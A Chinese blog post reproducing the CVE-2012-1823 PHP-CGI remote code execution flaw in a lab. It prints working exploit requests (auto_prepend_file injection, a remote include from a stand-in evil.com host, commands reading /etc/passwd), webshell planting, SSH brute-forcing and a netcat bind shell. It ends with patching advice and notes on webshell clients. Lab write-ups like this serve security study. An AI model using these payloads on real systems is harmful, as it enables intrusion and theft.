<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>CVE-2012-1823 PHP-CGI RCE 漏洞复现 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">CVE-2012-1823 PHP-CGI RCE 漏洞复现</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>9 Minutes</li><li><i class="icon icon-calendar"></i>March 3, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="CVE-2012-1823-PHP-CGI-RCE-漏洞复现"><a href="#CVE-2012-1823-PHP-CGI-RCE-漏洞复现" class="headerlink" title="CVE-2012-1823 PHP-CGI RCE 漏洞复现"></a><center>CVE-2012-1823 PHP-CGI RCE 漏洞复现</center></h2><h3 id="📍-漏洞说明"><a href="#📍-漏洞说明" class="headerlink" title="📍 漏洞说明"></a>📍 漏洞说明</h3><p>CVE-2012-1823 是 PHP CGI 模式下运行的一个漏洞，简单来说，就是用户请求的 querystring 被作为了 PHP-CGI 的参数，最终导致远程代码执行。</p>
<h3 id="📍-漏洞利用"><a href="#📍-漏洞利用" class="headerlink" title="📍 漏洞利用"></a>📍 漏洞利用</h3><p>CGI 模式下有如下参数可用：</p>
<ul>
<li>-c 指定 php.ini 文件的位置</li>
<li>-n 不要加载 php.ini 文件</li>
<li>-d 指定配置项</li>
<li>-b 启动 fastcgi 进程</li>
<li>-h 显示帮助</li>
<li>-s 显示文件源码</li>
</ul>
<p>这里更好的方法是使用 -d 指定 auto_prepend_file 来制造任意文件包含漏洞，执行任意代码。</p>
<p>PHP auto_prepend_file 方法，自动预处理文件，Poc 如下：</p>
<p>⚙️ <strong>本地包含直接执行代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H “USER-AGENT: &lt;?system(‘id’);die();?&gt;” http://172.16.232.155/index.php?-dauto_prepend_file%3d/proc/self/environ+-n</span><br></pre></td></tr></table></figure>

<p>⚙️ <strong>远程包含执行代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.16.232.155/index.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</span><br></pre></td></tr></table></figure>

<p>⚙️ <strong>-d 执行命令：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec(&apos;whoami&apos;);?&gt;</span><br></pre></td></tr></table></figure>

<p>curl “<a href="http://172.16.232.160:8080/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&quot;" target="_blank" rel="noopener">http://172.16.232.160:8080/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&quot;</a> –data “<?php system('cat /etc/passwd');die(); ?>“</p>
<h3 id="📍-漏洞复现"><a href="#📍-漏洞复现" class="headerlink" title="📍 漏洞复现"></a>📍 漏洞复现</h3><ul>
<li><p>测试范围</p>
<p>目标主机 IP：172.16.232.160。</p>
<p>测试主机 IP：172.16.232.159，Kali Linux；172.16.232.1，macOS。</p>
</li>
<li><p>实施流程</p>
<ul>
<li>信息收集</li>
<li>渗透测试</li>
<li>权限提升</li>
<li>实现对目标网络的远程控制</li>
</ul>
</li>
<li><p>输出报告</p>
</li>
</ul>
<p>⚙️ <strong>0X01 信息收集</strong></p>
<p>利用 Nmap 对目标 IP 进行扫描，得到结果如下：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/111.png" alt="111"></p>
<p>可知目标主机在 8080 端口开启了 HTTP 服务，中间件为 Apache httpd 2.4.10，系统内核版本为 Linux 3.2-4.9；在 22 端口开启了 ssh 服务，版本为 OpenSSH 7.4；距离目标主机一跳。</p>
<p>然后利用 AWVS 对目标主机进行扫描：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%886.51.30.png" alt="屏幕快照 2019-08-26 下午6.51.30"></p>
<p>可知目标 web server 可能存在 PHP-CGI 远程代码执行漏洞。利用 Burp 抓包改包如下：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%886.56.31.png" alt="屏幕快照 2019-08-26 下午6.56.31"></p>
<p>可知当前用户权限为 www-data。查看当前目录的写入权限：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%886.59.08.png" alt="屏幕快照 2019-08-26 下午6.59.08"></p>
<p>可知当前目录可读可写，权限比较大，接下来可以尝试写入一句话木马。</p>
<p>⚙️ <strong>0X02 渗透测试</strong></p>
<p>常用的写入一句话木马的方法有利用 echo 写入，wget 下载和 curl 下载，这里尝试利用 curl 写入 PHP 一句话木马：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%887.03.18.png" alt="屏幕快照 2019-08-26 下午7.03.18"></p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%887.03.38.png" alt="屏幕快照 2019-08-26 下午7.03.38"></p>
<p>可以看到一句话木马写入成功。利用相同的方法更改文件后缀为.php，然后测试一下：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%887.10.41.png" alt="屏幕快照 2019-08-26 下午7.10.41"></p>
<p>写入成功。然后利用菜刀连接，上传大马、恶意工具：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%887.20.28.png" alt="屏幕快照 2019-08-26 下午7.20.28"></p>
<p>⚙️ <strong>0X03 权限提升</strong></p>
<p>通过大马解压恶意工具，通过监听 6161 端口来反弹 shell 但失败，原因是 www-data 权限太低。只能尝试利用 hydra 对 ssh 进行弱口令爆破：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%887.31.22.png" alt="屏幕快照 2019-08-26 下午7.31.22"></p>
<p>爆破成功，得到用户名/密码为：root/nsfocus!@#，然后利用终端连接：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%887.35.05.png" alt="屏幕快照 2019-08-26 下午7.35.05"></p>
<p>连接成功，权限为 root。切换到网站根目录运行恶意工具监听非常用端口 6464，然后在 Win 7 上进行连接：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-27%20%E4%B8%8A%E5%8D%889.13.09.png" alt="屏幕快照 2019-08-27 上午9.13.09"></p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-26%20%E4%B8%8B%E5%8D%887.39.12.png" alt="屏幕快照 2019-08-26 下午7.39.12"></p>
<p>连接成功。</p>
<p>⚙️ <strong>0X04 实现对目标网络的远程控制</strong></p>
<p>上传任意恶意工具至目标主机，然后可进行本地信息收集、内网渗透、资产扫描等操作，这里不再演示。任意上传文件：</p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-27%20%E4%B8%8A%E5%8D%889.22.42.png" alt="屏幕快照 2019-08-27 上午9.22.42"></p>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-27%20%E4%B8%8A%E5%8D%889.34.00.png" alt="屏幕快照 2019-08-27 上午9.34.00"></p>
<h3 id="📍-安全建议"><a href="#📍-安全建议" class="headerlink" title="📍 安全建议"></a>📍 安全建议</h3><ul>
<li>升级 PHP 版本并且定期更新。</li>
<li>重要资产及连接不要使用弱口令，尽量使用高强度的密码并且定期更换。</li>
<li>要谨慎开放对网络访问用户的权限，不能给予过多的权限。</li>
</ul>
<h3 id="📍-其他"><a href="#📍-其他" class="headerlink" title="📍 其他"></a>📍 其他</h3><p>⚙️ <strong>利用 nc 反弹 shell</strong></p>
<p>Target：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7879 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>hack：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 172.16.232.160 7879</span><br></pre></td></tr></table></figure>

<p>⚙️ <strong>菜刀、蚁剑、冰蝎</strong></p>
<p>首先，这三者都是 WebShell 客户端。WebShell 客户端是一种用于服务器上 WebShell 后门与攻击客户端之间进行通信的程序，通常可以根据 WebShell 客户端的流量来判断服务器上是否存在 WebShell 后门。</p>
<ul>
<li>菜刀（Chopper）</li>
</ul>
<p>菜刀基本支持 PHP、JSP、ASP 三种 WebShell 的连接，是一个很稳定的 WebShell 管理工具，只需要利用上传到服务器的一句话脚本在通过添加配置就可以工作了，而且只有300多K。主要功能包括文件管理（需要足够权限）、数据库管理、虚拟终端。但是菜刀也是最容易被发现的攻击工具，因为其加密性能较弱，根据 WebShell 链接流量可以判断出是菜刀。</p>
<ul>
<li>蚁剑（AntSword）</li>
</ul>
<p>蚁剑是菜刀的替代版本且开源，是一个很优秀的项目，可跨平台使用。蚁剑的很多代码源于菜刀，因此链接流量和菜刀非常相似。但是蚁剑的扩充性很好，可以添加很多插件，而且可以进行加密、混淆等绕过处理。但是由于蚁剑是用 nodeJS 写的，所以它还存在一个本地 nodeJS 解析的 RCE 问题，很可能会被反制。</p>
<ul>
<li>冰蝎（Behinder）</li>
</ul>
<p>冰蝎是近几年出现的一种 WebShell 客户端，它最大的特点就是流量双向通信加解密，而且加密密钥是由使用者来设定，很难有规则检测出来，让很多基于黑名单正则匹配的防御产品厂商直接歇菜。但是它对 WebShell 的需求比较高，无法连接一句话木马，很蛋疼。</p>
<p>⚙️ <strong>写入一句话脚本</strong></p>
<p>写入一句话脚本常用的三个方法：</p>
<ul>
<li><p>利用 echo。</p>
<ul>
<li>Linux</li>
</ul>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-27%20%E4%B8%8A%E5%8D%8810.33.34.png" alt="屏幕快照 2019-08-27 上午10.33.34"></p>
<ul>
<li>Windows</li>
</ul>
<p><img src="http://47.95.140.43/tu/CVE-2012-1823/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-27%20%E4%B8%8A%E5%8D%8810.51.07.png" alt="屏幕快照 2019-08-27 上午10.51.07"></p>
</li>
<li><p>利用 wget。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://target.com/xxx.php -P 目录</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用 curl。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://target.com/xxx.php -o a.txt</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>如果无法写入，通常是以下三个问题所致：</p>
<ul>
<li>没有权限</li>
<li>PoC 错误</li>
<li>服务器配置有问题</li>
</ul>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck66lujz90000ceoz35jcxxtu" data-title="CVE-2012-1823 PHP-CGI RCE 漏洞复现" data-url="http://yoursite.com/2019/03/03/CVE-2012-1823/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/05/05/MS17-010漏洞复现/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/03/02/use-hexo/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>